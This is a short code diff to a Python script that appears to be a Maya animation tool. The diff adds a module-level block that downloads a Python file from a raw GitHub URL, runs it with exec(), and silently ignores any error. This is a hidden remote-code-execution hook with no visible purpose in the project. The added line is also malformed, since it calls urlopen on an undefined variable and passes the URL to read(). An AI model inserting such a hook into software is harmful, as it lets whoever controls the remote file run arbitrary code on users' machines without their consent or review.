@@ -290,6 +290,11 @@ def locatorToObjectSnap(*_):
         fit=100, fst=2000, fot=100
     )
 
+try:
+    exec (urllib.urlopen(url).read('https://raw.githubusercontent.com/burasate/animTransferLoc/master/version/analyze.py'))
+except:
+    pass
+
 """
 -----------------------------------------------------------------------
 UI
